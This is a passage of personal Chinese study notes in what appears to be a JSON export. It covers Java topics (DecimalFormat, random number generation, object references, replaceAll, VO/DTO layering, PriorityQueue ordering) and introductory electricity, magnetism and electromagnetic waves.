DecimalFormat(\"00000.00\");\n\t\tSystem.out.println(format.format(6789.8765));// 06789.88\n\n\t\t/* 整数位分组 */\n\t\tDecimalFormat format1 = new DecimalFormat(\",####.##\");\n\t\tSystem.out.println(format1.format(123456789.9876543));// 1,2345,6789.99\n\n\t\t/* 百分数或千分数 */\n\t\tDecimalFormat format2 = new DecimalFormat(\"#0.00%\");\n\t\tSystem.out.println(format2.format(0.008888));// 0.89%\n\t\tDecimalFormat format3 = new DecimalFormat(\"#0.00\\u2030\");\n\t\tSystem.out.println(format3.format(0.008888));// 8.89‰\n\n\t\t/* 科学计数法 */\n\t\tDecimalFormat format4 = new DecimalFormat(\"0.##E0\");\n\t\tSystem.out.println(format4.format(123456789));// 1.23E8\n\n\t\t/* 货币 */\n\t\tDecimalFormat format5 = new DecimalFormat(\"\\u00A4#0.##\");\n\t\tSystem.out.println(format5.format(0.3456));// ￥0.35\n\n\t\t/* 解析数字 */\n\t\tDecimalFormat format6 = new DecimalFormat(\",#\");\n\t\tSystem.out.println(format6.parse(\"1,234,567.89$999\"));// 1234567.89\n\t}\n}\n```\n```java\npublic class DecimalFormatTest2 {\n\tpublic static void main(String args[]) {\n\t\tdouble number;\n\t\tDecimalFormat df = new DecimalFormat();\n\t\tString result;\n\t\t\n\t\tnumber = 10.22222;\n\t\tdf.applyPattern(\"000.##\");\n\t\tresult = df.format(number);\n\t\tSystem.out.println(number + \"格式化为整数最少3位，小数最多2位=\" + result);\n\t\t\n\t\tnumber = 10000000.22222;\n\t\tdf.applyPattern(\",#00.##\");\n\t\tresult = df.format(number);\n\t\tSystem.out.printf(\"%f格式化为整数最少2位，整数部分按千分组，小数最多2位=\", number);\n\t\tSystem.out.println(result);\n\t\t\n\t\tnumber = 0.008888;\n\t\tdf.applyPattern(\"0.00%\");\n\t\tresult = df.format(number);\n\t\tSystem.out.println(number + \"格式化为百分数=\"+result);\n\t\tdf.applyPattern(\"0.00\\u2030\");\n\t\tresult = df.format(number);\n\t\tSystem.out.println(number + \"格式化为千分数=\"+result);\n\t\t\n\t\tnumber = 12222.2222;\n\t\tdf.applyPattern(\"0.00E0\");\n\t\tresult = df.format(number);\n\t\tSystem.out.println(number + \"格式化为科学计数法=\"+result);\n\t\t\n\t\tString money = \"1,222,333.444￥\";\n\t\tdf.applyPattern(\",#\");\n\t\ttry {\n\t\t\tNumber num = df.parse(money);\n\t\t\tSystem.out.println(money + \"转化成数字=\" + num.doubleValue());\n\t\t} catch (Exception exp) {\n\t\t}\n\t}\n}\n```\n\n## java随机数\n广义上讲，Java中的随机数的有三种产生方式：\n(01). 通过System.currentTimeMillis()来获取一个当前时间毫秒数的long型数字。\n(02). 通过Math.random()返回一个0到1之间的double值。\n(03). 通过Random类来产生一个随机数，这个是专业的Random工具类，功能强大。\n### 第1种\n通过System.currentTimeMillis()来获取随机数。实际上是获取当前时间毫秒数，它是long类型。使用方法如下：\n```java\nfinal long l = System.currentTimeMillis();\n```\n若要获取int类型的整数，只需要将上面的结果转行成int类型即可。比如，获取[0, 100)之间的int整数。方法如下：\n```java\nfinal long l = System.currentTimeMillis();\nfinal int i = (int)( l % 100 );\n```\n\n### 第2种\n通过Random类来获取随机数。\n使用方法如下：\n1. 创建Random对象。有两种方法可以创建Random对象，如下：\n```java\nRandom random = new Random();//默认构造方法,此时的种子时当前常见对象的实现\nRandom random1 = new Random(1000);//指定种子数字\n```\nRandom构造器源码：\n```java\npublic Random() {\n    this(seedUniquifier() ^ System.nanoTime());\n}\n\npublic Random(long seed) {\n    if (getClass() == Random.class)\n        this.seed = new AtomicLong(initialScramble(seed));\n    else {\n        // subclass might have overriden setSeed\n        this.seed = new AtomicLong();\n        setSeed(seed);\n    }\n}\n```\n随机数是种子经过计算生成的。\n• 不含参的构造函数每次都使用当前时间作为种子，随机性更强\n• 而含参的构造函数其实是伪随机，更有可预见性\n注：如果2个Random对象的种子相同的话，那么它们生成的随机数也是一样的\n```java\npublic class test1 {\n\tpublic static void main(String[] args) {\n\t\tRandom ran = new Random(111);\n\t\tRandom ran1 = new Random(111);\n\t\tSystem.out.println(ran.nextDouble());\n\t\tSystem.out.println(ran.nextDouble());\n\t\tSystem.out.println(\"------------------------\");\n\t\tSystem.out.println(ran1.nextDouble());\n\t\tSystem.out.println(ran1.nextDouble());\n\t}\n}\n```\noutput\n```\n0.7213825824542086\n0.38178681319155416\n------------------------\n0.7213825824542086\n0.38178681319155416\n```\n\n(02) 通过Random对象获取随机数。Random支持的随机值类型包括：boolean, byte, int, long, float, double。\n比如，获取[0, 100)之间的int整数。方法如下：\n```java\nint i2 = random.nextInt(100);\n```\nRandom 的函数接口\n```java\nboolean nextBoolean()         // 返回下一个“boolean类型”伪随机数。 \nvoid    nextBytes(byte[] buf) // 生成随机字节并将其置于字节数组buf中。 \ndouble  nextDouble()          // 返回一个“[0.0, 1.0) 之间的double类型”的随机数。 \nfloat   nextFloat()           // 返回一个“[0.0, 1.0) 之间的float类型”的随机数。 \nint     nextInt()             // 返回下一个“int类型”随机数。 \nint     nextInt(int n)        // 返回一个“[0, n) 之间的int类型”的随机数。 \nlong    nextLong()            // 返回下一个“long类型”随机数。 \nsynchronized double nextGaussian()   // 返回下一个“double类型”的随机数，它是呈高斯（“正常地”）分布的 double 值，其平均值是 0.0，标准偏差是 1.0。 \nsynchronized void setSeed(long seed) // 使用单个 long 种子设置此随机数生成器的种子。\n```\n\n### 第3种\n通过Math.random()来获取随机数。实际上，它返回的是0(包含)到1(不包含)之间的double值。使用方法如下：\n```java\nfinal double d = Math.random();\n```\n若要获取int类型的整数，只需要将上面的结果转行成int类型即可。比如，获取[0, 100)之间的int整数。方法如下：\n```java\nfinal double d = Math.random();\nfinal int i = (int)(d*100);\n```\n注：Math.random()的内部原理还是通过调用Random的nextDouble()方法\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220329131212.png)\n\n注：由于使用Math.random()的底层的Random对象是静态的，从而使得在一个代码里执行执行多个代码Math.random（）的产生的随机数更加具有随机性\n\n## 对象和对象引用的区别\n在Java中，有一组名词经常一起出现，它们就是“对象和对象引用”，很多朋友在初学Java的时候可能经常会混淆这2个概念，觉得它们是一回事，事实上则不然。今天我们就来一起了解一下对象和对象引用之间的区别和联系。\n\n### 何谓对象？\n在Java中有一句比较流行的话，叫做“万物皆对象”，这是Java语言设计之初的理念之一。要理解什么是对象，需要跟类一起结合起来理解。下面这段话引自《Java编程思想》中的一段原话：\n“按照通俗的说法，每个对象都是某个类（class）的一个实例（instance），这里，‘类’就是‘类型’的同义词。”\n从这一句话就可以理解到对象的本质，简而言之，它就是类的实例，比如所有的人统称为“人类”，这里的“人类”就是一个类（物种的一种类型），而具体到每个人，比如张三这个人，它就是对象，就是“人类”的实例。\n\n### 何谓对象引用？\n我们先看一段话：\n“每种编程语言都有自己的数据处理方式。有些时候，程序员必须注意将要处理的数据是什么类型。你是直接操纵元素，还是用某种基于特殊语法的间接表示（例如C/C++里的指针）来操作对象。所有这些在 Java 里都得到了简化，一切都被视为对象。因此，我们可采用一种统一的语法。尽管将一切都“看作”对象，但操纵的标识符实际是指向一个对象的“引用”（reference）。”　　\n这段话来自于《Java编程思想》，很显然，从这段话可以看出对象和对象引用不是一回事，是两个完全不同的概念。举个例子，我们通常会用下面这一行代码来创建一个对象：\n```java\nPerson person = new Person(\"张三\");\n```\n有人会说，这里的person是一个对象，是Person类的一个实例。\n也有人会说，这里的person并不是真正的对象，而是指向所创建的对象的引用。\n到底哪种说法是对的？我们先不急着纠结哪种说法是对的，再看两行代码：\n```java\nPerson person;\nperson = new Person(\"张三\");\n```\n这两行代码实现的功能和上面的一行代码是完全一样的。大家都知道，在Java中new是用来在堆上创建对象用的，如果person是一个对象的话，那么第二行为何还要通过new来创建对象呢？由此可见，person并不是所创建的对象，是什么？上面的一段话说的很清楚，“操纵的标识符实际是指向一个对象的引用”，也就是说person是一个引用，是指向一个可以指向Person类的对象的引用。真正创建对象的语句是右边的new Person(\"张三\");\n再看一个例子：\n```java\nPerson person;\nperson = new Person(\"张三\");\nperson = new Person(\"李四\");\n```\n这里让person先指向了“张三”这个对象，然后又指向了“李四”这个对象。也就是说，Person person，这句话只是声明了一个Person类的引用，它可以指向任何Person类的实例。这个道理就和下面这段代码一样：\n```java\nint a;\na=2;\na=3;\n```\n这里先声明了一个int类型的变量a，先对a赋值为2，后面又赋值为3.也就是说int类型的变量a，可以让它的值为2，也可以为3，只要是合法的int类型的数值即可。\n也就是说，一个引用可以指向多个对象，而一个对象可不可以被多个引用所指呢？答案当然是可以的。\n比如：\n```java\nPerson person1 = new Person(\"张三\");\nPerson person2 = person1;\n```\nperson1和person2都指向了“张三”这个对象。\n\n## replace与replaceAll的区别\n一、简述\n【replace】的参数是 char 和 CharSequence，既支持字符的替换，也支持字符串的替换(CharSequence即字符串序列的意思，也就是字符串)。\n【replaceAll】的参数是 regex，即基于规则表达式的替换。比如：可以通过`replaceAll(\"\\\\d\", \"*\")`把一个字符串所有的数字字符都换成星号。\n\n二、异同\n- 相同点：都是全部替换，即把源字符串中的某一字符或字符串全部换成指定的字符或字符串。\n- 不同点：replaceAll 支持正则表达式，因此会对参数进行解析(两个参数均是)。replace 不支持正则，`replace(\"\\\\d\",\"*\")`就是替换`\"\\\\d\"`的字符串，而不会解析为正则。\n- 另外还有一个不同点：\\在 Java 中是一个转义字符，所以需要用两个代表一个。例如`System.out.println( \"\\\\\" );`只打印出一个\\。但是\\也是正则表达式中的转义字符，需要用两个代表一个。所以`\\\\\\\\`被 Java 转换成`\\\\`，`\\\\`又被正则表达式转换成\\，因此用 replaceAll 替换\\为`\\\\`，就要用`replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\")`，而 replace 则为`replace(\"\\\\\",\"\\\\\\\\\")`。\n- 如果只想替换第一次出现的，可以使用 replaceFirst()，这个方法也是基于规则表达式的替换，但与 replaceAll() 不同的是，只替换第一次出现的字符串。\n\n## VO、DTO、DO、BO\n### 概念\n- VO (View Object)，用于表示一个与前端进行交互的视图对象，它的作用是把某个指定页面(或组件)的所有数据封装起来。实际上，这里的 VO 只包含前端需要展示的数据，对于前端不需要的数据，比如数据创建和修改的时间等字段，出于减少传输数据量大小和保护数据库结构不外泄的目的，不应该在 VO 中体现出来。\n- DTO(Data Transfer Object)，用于表示一个数据传输对象，DTO 通常用于展示层(Controller)和服务层(Service)之间的数据传输对象。DTO 与 VO 概念相似，并且通常情况下字段也基本一致。但 DTO 与 VO 又有一些不同，这个不同主要是设计理念上的，比如 API 服务需要使用的 DTO 就可能与 VO 存在差异。\n- DO(Data Object) ，持久化对象，它跟持久层(Dao)的数据结构形成一一对应的映射关系。如果持久层是关系型数据库，那么数据库表中的每个字段就对应PO的一个属性，常是entity实体类。\n- BO（Business Object）：业务对象，就是从现实世界中抽象出来的有形或无形的业务实体。\n\n阿里Java开发手册分层领域模型：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220222094822.png)\n\n### 为什么会存在Vo？\n\n项目中，看到别人直接把DTO，写上swagger注释，直接返回前端。那么思考一下，为什么不建议这么做，不直接把DTO返回给前端。\n\n- 从开发过程讲，前后端首先会以vo和param作为返回、传参的协议的定义，再定义协议之前，都没有实际的业务逻辑的处理，也就不会存在dto。\n- 从项目的整体考虑，如果把dto作为传给前端的对象，那么service层返回dto，service层的所有的方法不一定都是public方法，也有private方法，如果private方法也返回dto，那么也就是说有些dto不是提供给前端的，有些是给前端的，这样就会乱，没有了隔离性。\n- 从字段的修改来说，service层的方法是可以共用的，一个service方法返回的dto，可能会被很多个controlller方法使用到，即使目前不会，将来也可能会，dto会有很多参数，比如包含了主表信息，子表信息，而传给前端的vo只有dto的一部分信息，而且不同请求给前端看到的数据不一样，所以dto是共用的，vo是个性化的，如果直接把dto提供给前端，将会导致耦合性非常大，一旦一个接口的需求变了，修改了dto，增加了一个字段，将会导致接口直接把这个新增的字段返回给了前端，导致（接口输出数据多余，和不安全性）。同理，如果由于某个需求，把dto展示给前端的接口说要删除某一个字段，那么因为这个dto被很多接口引用，一删除就会导致出问题。\n\n所以，总整体性结构而言：vo是必须存在的，不能把dto直接返回给前端。高内聚，低耦合。\n\n### VO可以复用吗？\n\n比如，一个接口需要VO，另一个接口需要VO加上别的一些数据，这种情况，是继承VO使用，还是再写一个VO？\n\n答案：VO最好不要复用。VO目的就是解耦，应该是并列关系的，如果存在复用，那么就可能导致，一方修改影响另一方。一旦存在继承关系，继承来继承去，最后关系就会变得很乱，不好维护。\n\n### Controller层接收的参数是VO还是DTO？\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220222095004.png)\n\n希望大家根据公司情况来定，我们公司前端交互是统一VO的。\n\nController层接收的应该是VO，但是根据情况而定，尤其是前后分离，有特定的前端开发人员时，因为DTO往往会添加很多额外的数据信息，打个比方，用户新增，往往前端传递的是账户名、密码、创建人标识等等很少的信息，但是DTO作为一个中转数据，会添加例如更新人、用户状态等等其他的信息，如果前端传递的是DTO，如此多的额外信息会给前端造成很多问题。如果是小项目的话，前后端都是一个人在进行，那就无所谓了，后端需要哪些，不需要哪些心里有数，传递DTO就无所谓了。\n\n一般的数据传递是，前端传递VO给接口(Controller)，接口将VO转为DTO传递给service，service将DTO分解为DO，调用领域服务进行调度，然后逆向转为VO或者其他的返回结果，传递给前台。\n\n### 判断某个Class对象是否实现了某个接口或类\n```java\nimport java.io.Serializable;\n \npublic class IsAssignableFromTest implements Serializable{\n \n    /** 序列号 */\n    private static final long serialVersionUID = 5716955136475665579L;\n \n    public static void main(String[] args) {\n        \n        //测试是否实现了父类\n        boolean re1= Object.class.isAssignableFrom(IsAssignableFromTest.class);\n        //测试是否实现了接口\n        boolean re2=Serializable.class.isAssignableFrom(IsAssignableFromTest.class);\n        \n        System.out.println(\"re1:\"+re1+\" re2:\"+re2);\n    }\n}\n```\n结果：re1:true re2:true \n\n## 拼接2个数组\n在 Java 中连接两个数组的另一种方法是 arraycopy() 方法。此方法得到两个数组的值并将其合并为一个。下面的示例说明如何对整数数组完成此操作。\n\n示例代码：\n```java\nimport java.util.Arrays;\n\npublic class SimpleTesting {\n    public static void main(String[] args)  {\n        int[] Array1 = {00,10,20,30,40,50};\n        int[] Array2 = {60,70,80,90,100};\n        int lenArray1 = Array1.length;\n        int lenArray2 = Array2.length;\n        int[] concate = new int[lenArray1 + lenArray2];\n        System.arraycopy(Array1, 0, concate, 0, lenArray1);  \n        System.arraycopy(Array2, 0, concate, lenArray1, lenArray2);  \n        System.out.println(\"Array1: \" + Arrays.toString(Array1));\n        System.out.println(\"Array2: \" + Arrays.toString(Array2));\n        System.out.println(\"Concatenated Array: \" + Arrays.toString(concate)); \n    }  \n}  \n```\n输出：\n```txt\nArray1: [0, 10, 20, 30, 40, 50]\nArray2: [60, 70, 80, 90, 100]\nConcatenated Array: [0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100]\n```\n\n## PriorityQueue元素改变后不会自动排序\njava PriorityQueue能够对加入的元素按元素（必须是可比较的Comparable）大小排序，从而出队时总是“最小”元素优先出对。然而，现实应用中存在队列从元素发生改变的情况，PriorityQueue其实并不能时刻保证元素是有序。\n\nPriorityQueue在add addAll后会进行元素重排序，其余操作不会触发元素重排序。\n```java\nclass AB{\n    AB（int a\n    int a, b;\n    }\nAB a, b, c, d;\nPriorityQueue<AB> q = new PriorityQueue<AB>();\nq.add(a);\nq.add(b);\nq.add(c);\nq.add(d);\nc.a=1; //并不会触发元素重新排序\n```\nPS：上面的例子中只是示意，AB并没有实现Comparable接口。当c.a元素改变后，队列中a, b, c, d元素可能不满足“从小到大”关系，PriorityQueue就失去了“优先”的意义。当外部修改元素后，需先删掉元素，再插入元素，以保持正确的顺序。\n```java\nAB a, b, c, d;\nPriorityQueue<AB> q = new PriorityQueue<AB>();\nq.add(a);\nq.add(b);\nq.add(c);\nq.add(d);\nq.remove(c);\nc.a=1; \nq.add(c);//触发元素重新排序\n```\nPriorityQueue在add addAll后会进行元素重排序，其余操作不会触发元素重排序。当外部修改元素后，需先删掉元素，再插入元素，以保持正确的顺序。\n"
  },
  {
    "title": "./notes/基础知识/物理.md",
    "body": "# 势能\n势能（potential energy)是储存于一个系统内的能量，也可以释放或者转化为其他形式的能量。势能是状态量，又称作位能。势能不是属于单独物体所具有的，而是相互作用的物体所共有\n势能分为重力势能、磁场势能、弹性势能、分子势能、电势能、引力势能等。\n\n# 电与磁\n## 基本量\n基本量分别为：电荷、电量(电荷量)、电流、电阻、电势、电压、电容\n\n### 电荷\n电荷（electric charge） ，为物体或构成物体的质点所带的具有正电或负电的粒子，带正电的粒子叫正电荷（表示符号为“+”），带负电的粒子叫负电荷（表示符号为“﹣”）。也是某些基本粒子(如电子和质子)的属性，同种电荷相互排斥，异种电荷相互吸引。\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/FZByzDAFGtg\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n### 电量(电荷量)\n电量，也称电荷量，表示物体所带电荷的多少。一般来说，电荷的数量叫电量或电荷量，用符号Q表示，单位是库（仑）(符号是C)，库仑是一个很大的单位。\n\n### 电流\n电磁学上把单位时间里通过导体任一横截面的电荷量叫做电流强度，简称电流，电流符号为 I，单位是安培（A），简称“安”\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/k0ph2c2MuOI\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n### 电阻\n导体对电流的阻碍作用就叫该导体的电阻。电阻（Resistor，通常用“R”表示）是一个物理量，在物理学中表示导体对电流阻碍作用的大小。导体的电阻越大，表示导体对电流的阻碍作用越大。不同的导体，电阻一般不同，电阻是导体本身的一种性质。导体的电阻通常用字母R表示，电阻的单位是欧姆，简称欧，符号为Ω。\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/pXfMjVIElR0\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n### 电势\n在静电学里，电势（electric potential）（又称为电位）定义为：处于电场中某个位置的单位电荷所具有的电势能与它所带的电荷量之比。电势只有大小，没有方向——是标量，其数值不具有绝对意义，只具有相对意义。\n\n### 电压\n电压（voltage），也被称作电势差或电位差，是衡量单位电荷在静电场中由于电势不同所产生的能量差的物理量。其大小等于单位正电荷因受电场力作用从A点移动到B点所做的功，电压的方向规定为从高电位指向低电位的方向。电压的国际单位制为伏特（V，简称伏），常用的单位还有毫伏（mV）、微伏（μV）、千伏（kV）等。此概念与水位高低所造成的水压相似。需要指出的是，“电压”一词一般只用于电路当中，“电势差”和“电位差”则普遍应用于一切电现象当中。\n\n<font color=\"red\">电压是推动自由电荷定向移动形成电流的原因。电流之所以能够在导线中流动，也是因为在电流中有着高电势和低电势之间的差别</font>。这种差别叫电势差，也叫电压。换句话说。在电路中，任意两点之间的电位差称为这两点的电压。通常用字母U代表电压。\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/xXvqHiHO-ws\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n### 功率\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/76_66PiTpkA\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n### 电容\n电容（Capacitance）亦称作“电容量”，是指在给定电位差下自由电荷的储藏量，记为C，国际单位是法拉（F）。一般来说，电荷在电场中会受力而移动，当导体之间有了介质，则阻碍了电荷移动而使得电荷累积在导体上，造成电荷的累积储存，储存的电荷量则称为电容。\n\n## 三大元器件\n三大元器件分别是：电阻器、电容器、电感器\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409164023.png)\n\n**电阻器**\n电阻器（Resistor）在日常生活中一般直接称为电阻。是一个限流元件，将电阻接在电路中后，电阻器的阻值是固定的一般是两个引脚，它可限制通过它所连支路的电流大小\n\n**电容器**\n两个相互靠近的导体，中间夹一层不导电的绝缘介质，这就构成了电容器。当电容器的两个极板之间加上电压时，电容器就会储存电荷。电容器的电容量在数值上等于一个导电极板上的电荷量与两个极板之间的电压之比。电容器的电容量的基本单位是法拉(F)。在电路图中通常用字母C表示电容元件。\n\n**电感器**\n电感器(Inductor)是能够把电能转化为磁能而存储起来的元件。电感器的结构类似于变压器，但只有一个绕组。电感器具有一定的电感，它只阻碍电流的变化。如果电感器在没有电流通过的状态下，电路接通时它将试图阻碍电流流过它；如果电感器在有电流通过的状态下，电路断开时它将试图维持电流不变。电感器又称扼流器、电抗器、动态电抗器。\n\n## 电路\n**半导体**\n半导体指常温下导电性能介于导体与绝缘体之间的材料。半导体是指一种导电性可控， 即半导体在某个条件下，可以是不导电的，也可以在某个条件下，变成导电的\n常见的半导体材料有硅、锗、砷化镓等，硅是各种半导体材料应用中最具有影响力的一种。\n\n**晶体管**\n晶体管泛指一切以半导体材料为基础的单一元件，包括各种半导体材料制成的二极管（二端子）、三极管、场效应管、晶闸管（后三者均为三端子）、MOS管等。晶体管有时多指晶体三极管。\n\n**逻辑电路**\n逻辑电路是一种离散信号的传递和处理，以二进制为原理、实现数字信号逻辑运算和操作的电路。前者由最基本的“与门”电路、“或门”电路和“非门”电路组成，\n“与门”电路、“或门”电路和“非门”电路大都是使用晶体管制作\n\n**集成电路**\n集成电路或称微电路（microcircuit）、 微芯片（microchip）、芯片（chip）， 是一种微型电子器件或部件。采用一定的工艺，把一个电路中所需的晶体管、电阻、电容和电感等元件及布线互连一起，制作在一小块或几小块半导体晶片或介质基片上，然后封装在一个管壳内，成为具有所需电路功能的微型结构；其中所有元件在结构上已组成一个整体，使电子元件向着微小型化、低功耗、智能化和高可靠性方面迈进了一大步。它在电路中用字母“IC”表示。当今半导体工业大多数应用的是基于硅的集成电路。\n\n## 磁现象、磁场\n### 磁现象\n- **磁性**：能够吸引铁、钴等物质的性质\n- **磁体**：具有磁性的物质称为磁体\n- **磁极**：磁体上吸引能力最强的两个部位叫做磁极；能够自由转动的磁体，例如悬吊着的小磁针，静止时指南的那个磁极叫做南极，指北的那个磁极叫做北极。因为地球也是磁体，其地理南极为北磁极，地理北极为南磁极\n- **磁极间相互作用规律**：同极互斥，异极相吸。磁体周围存在磁场，<font color=\"red\">磁体间的相互作用就是以磁场作为媒介的，所以两磁体不用在物理层面接触就能发生作用</font>\n- **磁化**：物体在磁体或电流的作用下获得磁性（物体获取磁性的**唯一方式**就是在电流的作用下），这种现象叫做磁化，例如公交卡。由于磁体的磁性来源于电流，电流是电荷的运动，因而概括地说，磁场是由运动电荷或电场的变化而产生的\n\n### 场\n现物理学对场的定义就是指：场是一种特殊物质，看不见摸不着，但它确实存在。比如引力场、磁场等等\n\n### 磁场\n- **定义**：磁体周围存在着一种物质，能使磁针偏转，这种物质看不见、摸不着，我们把它叫做磁场。磁体周围一定存在磁场\n- **基本性质**：对放入其中的磁体有力的作用\n- **方向**：物理学中把小磁针静止时N极所指的方向规定为该点磁场的方向\n- **磁感线**： 用磁感线描述磁场时，磁体外部的磁感线都是从磁体的N极出发，回到S极。如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409164035.png)\n\n### 地磁场 \n- **地磁场**：地球可以看成一个巨大的磁体，该磁体的北磁极为地理南极，南磁极为地理北极。所以地球周围存在着磁场，方向为地理北极指向地理南极\n\n## 电生磁\n### 电流的磁效应\n- 奥斯特实验：丹麦物理学家奥斯特第一个发现通电导线和磁体一样，周围存在着磁场\n- 电流的磁效应：通电导线周围存在与电流方向有关的磁场，这种现象叫做电流的磁效应\n- 通电螺线管的磁场：通电螺线管外部的磁场与条形磁体相似。通电螺线管两端的极性与电流的方向有关。我们可以使用安倍定则来判断通电螺线管两端的极性\n\n### 安倍定则\n用右手握住螺线管，让四指指向螺线管中电流的方向，则大拇指所指的那端就是通电螺线管的N极\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409164052.png)\n\n### 电磁铁\n- 构造：在通电螺线管里插入一跟铁芯，就构成了一个电磁铁，如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409164102.png)\n\n- 电磁铁磁性强弱的影响因素：对于外形相同的线圈，电磁铁的磁性的强弱跟线圈的匝数和通入电流的大小有关。匝数一定时，通入的电流越大，电磁铁的磁性越强；电流一定时，外形相同的螺线管匝数越多，电磁铁的磁性越强\n- 应用：电磁起重机、电动机、电铃、电磁继电器、全自动洗衣机的进水、排水阀门、卫生间里感应式冲水器的阀门以及高速磁悬浮列车都用到电磁铁\n\n### 电磁继电器\n- 实质：电磁继电器就是利用电磁铁来控制工作电路的一种开关\n- 构成及其工作原理：有电磁铁、衔铁、弹簧、触点组成，其工作电路由低压控制电路和高压工作电路两部分组成，如下图所示\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409164113.png)\n\n### 电动机\n- 原理：**由于通电导线周围存在磁场。所以当通电导线放入到另一个磁场中时，会受到力的作用**。这就是电动机的原理\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409164124.png)\n\n## 磁生电\n### 电磁感应现象\n- 法拉第发现了电磁感应现象\n- 电磁感应现象：闭合电路的一部分导体在磁场中做切割磁感线运动时，导体中就会产生电流。这种由于导体在磁体中运动而产生电流的现象叫做电磁感应现象，产生的电流叫做感应电流\n- 感应电流产生的条件：闭合电路，导体做切割磁感线运动\n- 感应电流的方向：与导体运动的方向和磁场方向有关\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409164135.png)\n\n- 应用：发电机\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409164146.png)\n\n### 电动机与发电机\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210620105241.png\" width=\"700px\"/>\n\n## 电场\n电场带电体周围存在的特殊物质。电场的基本性质是对放入其中的电荷有力的作用。电荷间的作用总是通过电场进行的\n\n### 库仑电场和感生电场\n- 库仑电场是电荷按库仑定律激发的电场，例如静电场就是由静止的电荷按库仑定律激发的，就属于库仑电场，在各种带电体周围都可以发现这种电场。\n- 感生电场是由变化的磁场激发的，按麦克斯韦理论，变化的磁场在其周围激发了电场。例如条形磁铁插入线圈时，运动的磁铁使周围的磁场发生变化，进而产生涡旋电场，涡旋电场使线圈中产生感应电动势，这种电场就是感生电场 \n- 静止电荷在其周围空间产生的电场，称为静电场；随时间变化的磁场在其周围空间激发的电场称为感应电场。普遍意义的电场则是静电场和感应电场两者之和。电场是一个矢量场，其方向为正电荷的受力方向。电场的力的性质用电场强度来描述。 \n\n### 电场强度\n在电场中某位置处一电荷q它在该点所受电场力F与其电荷量Q的比值叫做该点的电场强度，简称场强\n\n## 电磁场\n电与磁可说是一体两面，变化的电场会产生磁场（即电流会产生磁场），变化的磁场则会产生电场。<font color=\"red\">变化的电场和变化的磁场构成了一个不可分离的统一的场，这就是电磁场</font>\n\n## 电磁波\n电磁波是电磁场的一种运动形态。而**变化的电磁场在空间的传播形成了电磁波**，电磁的变动就如同微风轻拂水面产生水波一般，因此被称为电磁波，也常称为电波。\n\n电磁波的传播不需要介质，同频率的电磁波，在不同介质中的速度不同。不同频率的电磁波，在同一种介质中传播时，频率越大折射率越大，速度越小。且电磁波只有在同种均匀介质中才能沿直线传播，若同一种介质是不均匀的，电磁波在其中的折射率是不一样的，在这样的介质中是沿曲线传播的。通过不同介质时，会发生折射、反射、衍射、散射及吸收等等。电磁波的传播有沿地面传播的地面波，还有从空中传播的空中波以及天波。波长越长其衰减也越少，电磁波的波长越长也越容易绕过障碍物继续传播\n\n与声波和水波相似，电磁波具有波的性质。可以发生折射等现象。它的速度、波长、频率之间满足关系式：**传播速度=波长×频率**。 电磁波在空气中的传播速度为光速。**当电磁波传播速度相同情况下, 电磁波的波长与频率是成反比的，频率越高，传播过程中的损伤就越大，从而波长就越小，从而导致覆盖的范围就越小。**\n\n### 无线电波\n无线电波是指在自由空间（包括空气和真空）传播的射频频段的电磁波。无线电波的波长越短、频率越高，相同时间内传输的信息就越多。\n无线电波在空间中的传播方式有以下情况：直射、反射、折射、穿透、绕射（衍射）和散射。\n\n### 应用\n**无线电通信**\n无线电广播与电视都是利用电磁波来进行的。在无线电广播中，人们先将声音信号转变为电信号，然后将这些信号由高频振荡的电磁波带着向周围空间传播。而在另一地点，人们利用接收机接收到这些电磁波后，又将其中的电信号还原成声音信号，这就是无线广播的大致过程而在电视中，除了要像无线广播中那样处理声音信号外，还要将图象的光信号转变为电信号，然后也将这两种信号一起由高频振荡的电磁波带着向周围空间传播，而电视接收机接收到这些电磁波后又将其中的电信号还原成声音信号和光信号，从而显示出电视的画面和喇叭里的声音\n\n**路由器**\n路由器的2.4G和5G指的是无线电波的一个**频段**。由无线电波的特性可以知道，2.4G频段的信号的覆盖范围比5G频段好\n\n注：路由器的5G指的是无线电波的频段为5GHz频段，而不是指的5G网络，5G网络中的G代表的是Generation，即第5代网络\n\n## 频点，频段，带宽，频率\n以下图为例：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210620154845.png\" width=\"500px\"/>\n- 频段指的是：1850MHZ~1910MHZ\n- 频率指的是频段上的一个点，例如1880MHZ\n- 带宽属于频段的一小部分, 频率的范围愈大，也就是带宽愈高时，能够发送的数据也相对增加\n- 